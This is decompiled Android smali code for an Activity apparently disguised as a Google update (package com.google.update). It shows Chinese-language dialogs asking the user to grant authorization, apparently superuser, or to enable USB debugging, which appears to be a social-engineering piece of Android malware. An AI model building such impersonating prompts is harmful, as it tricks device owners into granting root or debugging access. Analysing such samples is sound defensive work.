.class public Lcom/google/update/Dialog;
.super Landroid/app/Activity;
.source "Dialog.java"


# static fields
.field private static final DIALOG_GRANT_SET:I = 0x1

.field private static final DIALOG_GRANT_SU:I


# instance fields
.field private msg:Ljava/lang/String;

.field private type:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 12
    iput-object v0, p0, Lcom/google/update/Dialog;->type:Ljava/lang/String;

    .line 13
    iput-object v0, p0, Lcom/google/update/Dialog;->msg:Ljava/lang/String;

    .line 11
    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 6
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v5, 0x1

    .line 16
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 18
    new-instance v1, Landroid/widget/LinearLayout;

    invoke-direct {v1, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 19
    .local v1, "layout":Landroid/widget/LinearLayout;
    invoke-virtual {v1, v5}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 22
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v3, -0x1

    .line 23
    const/4 v4, -0x2

    .line 22
    invoke-direct {v2, v3, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 24
    .local v2, "params":Landroid/widget/LinearLayout$LayoutParams;
    invoke-virtual {v1, v2}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 25
    const/16 v3, 0x11

    invoke-virtual {v1, v3}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 27
    invoke-virtual {p0, v1}, Lcom/google/update/Dialog;->setContentView(Landroid/view/View;)V

    .line 29
    invoke-virtual {p0}, Lcom/google/update/Dialog;->getIntent()Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 30
    .local v0, "bundle":Landroid/os/Bundle;
    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/google/update/Dialog;->finish()V

    .line 31
    :cond_0
    const-string v3, "MSG"

    invoke-virtual {v0, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/google/update/Dialog;->msg:Ljava/lang/String;

    .line 32
    const-string v3, "TYPEdsada"

    invoke-virtual {v0, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/google/update/Dialog;->type:Ljava/lang/String;

    .line 33
    const-string v3, "su"

    iget-object v4, p0, Lcom/google/update/Dialog;->type:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 34
    const/4 v3, 0x0

    invoke-virtual {p0, v3}, Lcom/google/update/Dialog;->showDialog(I)V

    .line 36
    :goto_0
    return-void

    .line 35
    :cond_1
    invoke-virtual {p0, v5}, Lcom/google/update/Dialog;->showDialog(I)V

    goto :goto_0
.end method

.method protected onCreateDialog(I)Landroid/app/Dialog;
    .locals 4
    .param p1, "id"    # I

    .prologue
    const v2, 0x108009b

    const-string v3, "\u786e\u8ba4"

    .line 45
    packed-switch p1, :pswitch_data_0

    .line 71
    invoke-virtual {p0}, Lcom/google/update/Dialog;->finish()V

    .line 72
    const/4 v0, 0x0

    .line 74
    .local v0, "dialog":Landroid/app/Dialog;
    :goto_0
    return-object v0

    .line 47
    .end local v0    # "dialog":Landroid/app/Dialog;
    :pswitch_0
    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 48
    const-string v2, "\u8bf7\u6388\u6743"

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 49
    iget-object v2, p0, Lcom/google/update/Dialog;->msg:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 50
    const-string v2, "\u786e\u8ba4"

    new-instance v2, Lcom/google/update/Dialog$1;

    invoke-direct {v2, p0}, Lcom/google/update/Dialog$1;-><init>(Lcom/google/update/Dialog;)V

    invoke-virtual {v1, v3, v2}, Landroid/app/AlertDialog$Builder;->setNeutralButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 57
    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    .line 58
    .restart local v0    # "dialog":Landroid/app/Dialog;
    goto :goto_0

    .line 60
    .end local v0    # "dialog":Landroid/app/Dialog;
    :pswitch_1
    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 61
    const-string v2, "\u6253\u5f00USB\u8c03\u8bd5"

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 62
    iget-object v2, p0, Lcom/google/update/Dialog;->msg:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 63
    const-string v2, "\u786e\u8ba4"

    new-instance v2, Lcom/google/update/Dialog$2;

    invoke-direct {v2, p0}, Lcom/google/update/Dialog$2;-><init>(Lcom/google/update/Dialog;)V

    invoke-virtual {v1, v3, v2}, Landroid/app/AlertDialog$Builder;->setNeutralButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    .line 68
    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    .line 69
    .restart local v0    # "dialog":Landroid/app/Dialog;
    goto :goto_0

    .line 45
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method
